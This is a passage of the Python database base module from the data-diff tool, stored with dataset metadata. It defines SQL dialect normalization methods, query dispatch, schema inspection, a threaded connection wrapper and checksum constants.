\"\"\"Convert from binary precision, used by floats, to decimal precision.\"\"\"\n        # See: https://en.wikipedia.org/wiki/Single-precision_floating-point_format\n        return math.floor(math.log(2**p, 10))\n\n    @property\n    @abstractmethod\n    def name(self) -> str:\n        \"Name of the dialect\"\n\n    @property\n    @abstractmethod\n    def ROUNDS_ON_PREC_LOSS(self) -> bool:\n        \"True if db rounds real values when losing precision, False if it truncates.\"\n\n    @abstractmethod\n    def quote(self, s: str):\n        \"Quote SQL name\"\n\n    @abstractmethod\n    def to_string(self, s: str) -> str:\n        # TODO rewrite using cast_to(x, str)\n        \"Provide SQL for casting a column to string\"\n\n    @abstractmethod\n    def set_timezone_to_utc(self) -> str:\n        \"Provide SQL for setting the session timezone to UTC\"\n\n    @abstractmethod\n    def md5_as_int(self, s: str) -> str:\n        \"Provide SQL for computing md5 and returning an int\"\n\n    @abstractmethod\n    def md5_as_hex(self, s: str) -> str:\n        \"\"\"Method to calculate MD5\"\"\"\n\n    @abstractmethod\n    def normalize_timestamp(self, value: str, coltype: TemporalType) -> str:\n        \"\"\"Creates an SQL expression, that converts 'value' to a normalized timestamp.\n\n        The returned expression must accept any SQL datetime/timestamp, and return a string.\n\n        Date format: ``YYYY-MM-DD HH:mm:SS.FFFFFF``\n\n        Precision of dates should be rounded up/down according to coltype.rounds\n        e.g. precision 3 and coltype.rounds:\n            - 1969-12-31 23:59:59.999999 -> 1970-01-01 00:00:00.000000\n            - 1970-01-01 00:00:00.000888 -> 1970-01-01 00:00:00.001000\n            - 1970-01-01 00:00:00.123123 -> 1970-01-01 00:00:00.123000\n\n        Make sure NULLs remain NULLs\n        \"\"\"\n\n    @abstractmethod\n    def normalize_number(self, value: str, coltype: FractionalType) -> str:\n        \"\"\"Creates an SQL expression, that converts 'value' to a normalized number.\n\n        The returned expression must accept any SQL int/numeric/float, and return a string.\n\n        Floats/Decimals are expected in the format\n        \"I.P\"\n\n        Where I is the integer part of the number (as many digits as necessary),\n        and must be at least one digit (0).\n        P is the fractional digits, the amount of which is specified with\n        coltype.precision. Trailing zeroes may be necessary.\n        If P is 0, the dot is omitted.\n\n        Note: We use 'precision' differently than most databases. For decimals,\n        it's the same as ``numeric_scale``, and for floats, who use binary precision,\n        it can be calculated as ``log10(2**numeric_precision)``.\n        \"\"\"\n\n    def normalize_boolean(self, value: str, _coltype: Boolean) -> str:\n        \"\"\"Creates an SQL expression, that converts 'value' to either '0' or '1'.\"\"\"\n        return self.to_string(value)\n\n    def normalize_uuid(self, value: str, coltype: ColType_UUID) -> str:\n        \"\"\"Creates an SQL expression, that strips uuids of artifacts like whitespace.\"\"\"\n        if isinstance(coltype, String_UUID):\n            return f\"TRIM({value})\"\n        return self.to_string(value)\n\n    def normalize_json(self, value: str, _coltype: JSON) -> str:\n        \"\"\"Creates an SQL expression, that converts 'value' to its minified json string representation.\"\"\"\n        return self.to_string(value)\n\n    def normalize_array(self, value: str, _coltype: Array) -> str:\n        \"\"\"Creates an SQL expression, that serialized an array into a JSON string.\"\"\"\n        return self.to_string(value)\n\n    def normalize_struct(self, value: str, _coltype: Struct) -> str:\n        \"\"\"Creates an SQL expression, that serialized a typed struct into a JSON string.\"\"\"\n        return self.to_string(value)\n\n    def normalize_value_by_type(self, value: str, coltype: ColType) -> str:\n        \"\"\"Creates an SQL expression, that converts 'value' to a normalized representation.\n\n        The returned expression must accept any SQL value, and return a string.\n\n        The default implementation dispatches to a method according to `coltype`:\n\n        ::\n\n            TemporalType    -> normalize_timestamp()\n            FractionalType  -> normalize_number()\n            *else*          -> to_string()\n\n            (`Integer` falls in the *else* category)\n\n        \"\"\"\n        if isinstance(coltype, TemporalType):\n            return self.normalize_timestamp(value, coltype)\n        elif isinstance(coltype, FractionalType):\n            return self.normalize_number(value, coltype)\n        elif isinstance(coltype, ColType_UUID):\n            return self.normalize_uuid(value, coltype)\n        elif isinstance(coltype, Boolean):\n            return self.normalize_boolean(value, coltype)\n        elif isinstance(coltype, JSON):\n            return self.normalize_json(value, coltype)\n        elif isinstance(coltype, Array):\n            return self.normalize_array(value, coltype)\n        elif isinstance(coltype, Struct):\n            return self.normalize_struct(value, coltype)\n        return self.to_string(value)\n\n    def optimizer_hints(self, hints: str) -> str:\n        return f\"/*+ {hints} */ \"\n\n\nT = TypeVar(\"T\", bound=BaseDialect)\nRow = Sequence[Any]\n\n\n@attrs.define(frozen=True)\nclass QueryResult:\n    rows: List[Row]\n    columns: Optional[list] = None\n\n    def __iter__(self) -> Iterator[Row]:\n        return iter(self.rows)\n\n    def __len__(self) -> int:\n        return len(self.rows)\n\n    def __getitem__(self, i) -> Row:\n        return self.rows[i]\n\n\n@attrs.define(frozen=False, kw_only=True)\nclass Database(abc.ABC):\n    \"\"\"Base abstract class for databases.\n\n    Used for providing connection code and implementation specific SQL utilities.\n\n    Instanciated using :meth:`~data_diff.connect`\n    \"\"\"\n\n    DIALECT_CLASS: ClassVar[Type[BaseDialect]] = BaseDialect\n\n    SUPPORTS_ALPHANUMS: ClassVar[bool] = True\n    SUPPORTS_UNIQUE_CONSTAINT: ClassVar[bool] = False\n    CONNECT_URI_KWPARAMS: ClassVar[List[str]] = []\n\n    default_schema: Optional[str] = None\n    _interactive: bool = False\n    is_closed: bool = False\n    _dialect: BaseDialect = None\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.close()\n\n    @property\n    def name(self):\n        return type(self).__name__\n\n    def compile(self, sql_ast):\n        return self.dialect.compile(Compiler(self), sql_ast)\n\n    def query(self, sql_ast: Union[Expr, Generator], res_type: type = None, log_message: Optional[str] = None):\n        \"\"\"Query the given SQL code/AST, and attempt to convert the result to type 'res_type'\n\n        If given a generator, it will execute all the yielded sql queries with the same thread and cursor.\n        The results of the queries a returned by the `yield` stmt (using the .send() mechanism).\n        It's a cleaner approach than exposing cursors, but may not be enough in all cases.\n        \"\"\"\n\n        compiler = Compiler(self)\n        if isinstance(sql_ast, Generator):\n            sql_code = ThreadLocalInterpreter(compiler, sql_ast)\n        elif isinstance(sql_ast, list):\n            for i in sql_ast[:-1]:\n                self.query(i)\n            return self.query(sql_ast[-1], res_type)\n        else:\n            if isinstance(sql_ast, str):\n                sql_code = sql_ast\n            else:\n                if res_type is None:\n                    res_type = sql_ast.type\n                sql_code = self.compile(sql_ast)\n                if sql_code is SKIP:\n                    return SKIP\n\n            if log_message:\n                logger.debug(\"Running SQL (%s): %s \\n%s\", self.name, log_message, sql_code)\n            else:\n                logger.debug(\"Running SQL (%s):\\n%s\", self.name, sql_code)\n\n        if self._interactive and isinstance(sql_ast, Select):\n            explained_sql = self.compile(Explain(sql_ast))\n            explain = self._query(explained_sql)\n            for row in explain:\n                # Most returned a 1-tuple. Presto returns a string\n                if isinstance(row, tuple):\n                    (row,) = row\n                logger.debug(\"EXPLAIN: %s\", row)\n            answer = input(\"Continue? [y/n] \")\n            if answer.lower() not in [\"y\", \"yes\"]:\n                sys.exit(1)\n\n        res = self._query(sql_code)\n        if res_type is list:\n            return list(res)\n        elif res_type is int:\n            if not res:\n                raise ValueError(\"Query returned 0 rows, expected 1\")\n            row = _one(res)\n            if not row:\n                raise ValueError(\"Row is empty, expected 1 column\")\n            res = _one(row)\n            if res is None:  # May happen due to sum() of 0 items\n                return None\n            return int(res)\n        elif res_type is datetime:\n            res = _one(_one(res))\n            if isinstance(res, str):\n                res = datetime.fromisoformat(res[:23])  # TODO use a better parsing method\n            return res\n        elif res_type is tuple:\n            assert len(res) == 1, (sql_code, res)\n            return res[0]\n        elif getattr(res_type, \"__origin__\", None) is list and len(res_type.__args__) == 1:\n            if res_type.__args__ in ((int,), (str,)):\n                return [_one(row) for row in res]\n            elif res_type.__args__ in [(Tuple,), (tuple,)]:\n                return [tuple(row) for row in res]\n            elif res_type.__args__ == (dict,):\n                return [dict(safezip(res.columns, row)) for row in res]\n            else:\n                raise ValueError(res_type)\n        return res\n\n    def enable_interactive(self):\n        self._interactive = True\n\n    def select_table_schema(self, path: DbPath) -> str:\n        \"\"\"Provide SQL for selecting the table schema as (name, type, date_prec, num_prec)\"\"\"\n        schema, name = self._normalize_table_path(path)\n\n        return (\n            \"SELECT column_name, data_type, datetime_precision, numeric_precision, numeric_scale \"\n            \"FROM information_schema.columns \"\n            f\"WHERE table_name = '{name}' AND table_schema = '{schema}'\"\n        )\n\n    def query_table_schema(self, path: DbPath) -> Dict[str, RawColumnInfo]:\n        \"\"\"Query the table for its schema for table in 'path', and return {column: tuple}\n        where the tuple is (table_name, col_name, type_repr, datetime_precision?, numeric_precision?, numeric_scale?)\n\n        Note: This method exists instead of select_table_schema(), just because not all databases support\n              accessing the schema using a SQL query.\n        \"\"\"\n        rows = self.query(self.select_table_schema(path), list, log_message=path)\n\n        if not rows:\n            raise RuntimeError(f\"{self.name}: Table '{'.'.join(path)}' does not exist, or has no columns\")\n\n        d = {\n            r[0]: RawColumnInfo(\n                column_name=r[0],\n                data_type=r[1],\n                datetime_precision=r[2],\n                numeric_precision=r[3],\n                numeric_scale=r[4],\n                collation_name=r[5] if len(r) > 5 else None,\n            )\n            for r in rows\n        }\n\n        assert len(d) == len(rows)\n        return d\n\n    def select_table_unique_columns(self, path: DbPath) -> str:\n        \"\"\"Provide SQL for selecting the names of unique columns in the table\"\"\"\n        schema, name = self._normalize_table_path(path)\n\n        return (\n            \"SELECT column_name \"\n            \"FROM information_schema.key_column_usage \"\n            f\"WHERE table_name = '{name}' AND table_schema = '{schema}'\"\n        )\n\n    def query_table_unique_columns(self, path: DbPath) -> List[str]:\n        \"\"\"Query the table for its unique columns for table in 'path', and return {column}\"\"\"\n        if not self.SUPPORTS_UNIQUE_CONSTAINT:\n            raise NotImplementedError(\"This database doesn't support 'unique' constraints\")\n        res = self.query(self.select_table_unique_columns(path), List[str], log_message=path)\n        return list(res)\n\n    def _process_table_schema(\n        self,\n        path: DbPath,\n        raw_schema: Dict[str, RawColumnInfo],\n        filter_columns: Sequence[str] = None,\n        where: str = None,\n    ):\n        \"\"\"Process the result of query_table_schema().\n\n        Done in a separate step, to minimize the amount of processed columns.\n        Needed because processing each column may:\n        * throw errors and warnings\n        * query the database to sample values\n\n        \"\"\"\n        if filter_columns is None:\n            filtered_schema = raw_schema\n        else:\n            accept = {i.lower() for i in filter_columns}\n            filtered_schema = {name: row for name, row in raw_schema.items() if name.lower() in accept}\n\n        col_dict = {info.column_name: self.dialect.parse_type(path, info) for info in filtered_schema.values()}\n\n        self._refine_coltypes(path, col_dict, where)\n\n        # Return a dict of form {name: type} after normalization\n        return col_dict\n\n    def _refine_coltypes(\n        self, table_path: DbPath, col_dict: Dict[str, ColType], where: Optional[str] = None, sample_size=64\n    ) -> Dict[str, ColType]:\n        \"\"\"Refine the types in the column dict, by querying the database for a sample of their values\n\n        'where' restricts the rows to be sampled.\n        \"\"\"\n\n        text_columns = [k for k, v in col_dict.items() if isinstance(v, Text)]\n        if not text_columns:\n            return col_dict\n\n        fields = [Code(self.dialect.normalize_uuid(self.dialect.quote(c), String_UUID())) for c in text_columns]\n\n        samples_by_row = self.query(\n            table(*table_path).select(*fields).where(Code(where) if where else SKIP).limit(sample_size),\n            list,\n            log_message=table_path,\n        )\n        samples_by_col = list(zip(*samples_by_row)) if samples_by_row else [[]] * len(text_columns)\n        for col_name, samples in safezip(text_columns, samples_by_col):\n            uuid_samples = [s for s in samples if s and is_uuid(s)]\n\n            if uuid_samples:\n                if len(uuid_samples) != len(samples):\n                    logger.warning(\n                        f\"Mixed UUID/Non-UUID values detected in column {'.'.join(table_path)}.{col_name}, disabling UUID support.\"\n                    )\n                else:\n                    assert col_name in col_dict\n                    col_dict[col_name] = String_UUID(\n                        lowercase=all(s == s.lower() for s in uuid_samples),\n                        uppercase=all(s == s.upper() for s in uuid_samples),\n                    )\n                    continue\n\n            if self.SUPPORTS_ALPHANUMS:  # Anything but MySQL (so far)\n                alphanum_samples = [s for s in samples if String_Alphanum.test_value(s)]\n                if alphanum_samples:\n                    if len(alphanum_samples) != len(samples):\n                        logger.debug(\n                            f\"Mixed Alphanum/Non-Alphanum values detected in column {'.'.join(table_path)}.{col_name}. It cannot be used as a key.\"\n                        )\n                    else:\n                        assert col_name in col_dict\n                        col_dict[col_name] = String_VaryingAlphanum(collation=col_dict[col_name].collation)\n\n        return col_dict\n\n    def _normalize_table_path(self, path: DbPath) -> DbPath:\n        if len(path) == 1:\n            return self.default_schema, path[0]\n        elif len(path) == 2:\n            return path\n\n        raise ValueError(f\"{self.name}: Bad table path for {self}: '{'.'.join(path)}'. Expected form: schema.table\")\n\n    def _query_cursor(self, c, sql_code: str) -> QueryResult:\n        assert isinstance(sql_code, str), sql_code\n        try:\n            c.execute(sql_code)\n            if sql_code.lower().startswith((\"select\", \"explain\", \"show\")):\n                columns = [col[0] for col in c.description]\n\n                fetched = c.fetchall()\n                result = QueryResult(fetched, columns)\n                return result\n        except Exception as _e:\n            # logger.exception(e)\n            # logger.error(f\"Caused by SQL: {sql_code}\")\n            raise\n\n    def _query_conn(self, conn, sql_code: Union[str, ThreadLocalInterpreter]) -> QueryResult:\n        c = conn.cursor()\n        callback = partial(self._query_cursor, c)\n        return apply_query(callback, sql_code)\n\n    def close(self):\n        \"\"\"Close connection(s) to the database instance. Querying will stop functioning.\"\"\"\n        self.is_closed = True\n\n    @property\n    def dialect(self) -> BaseDialect:\n        \"The dialect of the database. Used internally by Database, and also available publicly.\"\n\n        if not self._dialect:\n            self._dialect = self.DIALECT_CLASS()\n        return self._dialect\n\n    @property\n    @abstractmethod\n    def CONNECT_URI_HELP(self) -> str:\n        \"Example URI to show the user in help and error messages\"\n\n    @property\n    @abstractmethod\n    def CONNECT_URI_PARAMS(self) -> List[str]:\n        \"List of parameters given in the path of the URI\"\n\n    @abstractmethod\n    def _query(self, sql_code: str) -> list:\n        \"Send query to database and return result\"\n\n    @property\n    @abstractmethod\n    def is_autocommit(self) -> bool:\n        \"Return whether the database autocommits changes. When false, COMMIT statements are skipped.\"\n\n\n@attrs.define(frozen=False)\nclass ThreadedDatabase(Database):\n    \"\"\"Access the database through singleton threads.\n\n    Used for database connectors that do not support sharing their connection between different threads.\n    \"\"\"\n\n    thread_count: int = 1\n\n    _init_error: Optional[Exception] = None\n    _queue: Optional[ThreadPoolExecutor] = None\n    thread_local: threading.local = attrs.field(factory=threading.local)\n\n    def __attrs_post_init__(self) -> None:\n        self._queue = ThreadPoolExecutor(self.thread_count, initializer=self.set_conn)\n        logger.info(f\"[{self.name}] Starting a threadpool, size={self.thread_count}.\")\n\n    def set_conn(self):\n        assert not hasattr(self.thread_local, \"conn\")\n        try:\n            self.thread_local.conn = self.create_connection()\n        except Exception as e:\n            self._init_error = e\n\n    def _query(self, sql_code: Union[str, ThreadLocalInterpreter]) -> QueryResult:\n        r = self._queue.submit(self._query_in_worker, sql_code)\n        return r.result()\n\n    def _query_in_worker(self, sql_code: Union[str, ThreadLocalInterpreter]):\n        \"\"\"This method runs in a worker thread\"\"\"\n        if self._init_error:\n            raise self._init_error\n        return self._query_conn(self.thread_local.conn, sql_code)\n\n    @abstractmethod\n    def create_connection(self):\n        \"\"\"Return a connection instance, that supports the .cursor() method.\"\"\"\n\n    def close(self):\n        super().close()\n        self._queue.shutdown()\n        if hasattr(self.thread_local, \"conn\"):\n            self.thread_local.conn.close()\n\n    @property\n    def is_autocommit(self) -> bool:\n        return False\n\n\nCHECKSUM_HEXDIGITS = 12  # Must be 12 or lower, otherwise SUM() overflows\nMD5_HEXDIGITS = 32\n\n_CHECKSUM_BITSIZE = CHECKSUM_HEXDIGITS << 2\nCHECKSUM_MASK = (2**_CHECKSUM_BITSIZE) - 1\n\n# bigint is typically 8 bytes\n# if checksum is shorter, most databases will pad it with zeros\n# 0xFF → 0x00000000000000FF;\n# because of that, the numeric representation is always positive,\n# which limits the number of checksums that we can add together before overflowing.\n# we can fix that by adding a negative offset of half the max value,\n# so that the distribution is from -0.5*max to +0.5*max.\n# then negative numbers can compensate for the positive ones allowing to add more checksums together\n# without overflowing.\nCHECKSUM_OFFSET = CHECKSUM_MASK // 2\n\nDEFAULT_DATETIME_PRECISION = 6\nDEFAULT_NUMERIC_PRECISION = 24\n\nTIMESTAMP_PRECISION_POS = 20  # len(\"2022-06-03 12:24:35.\") == 20\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/databases/base.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.7999999999999999, "authority_level": "high", "authentic": true}}
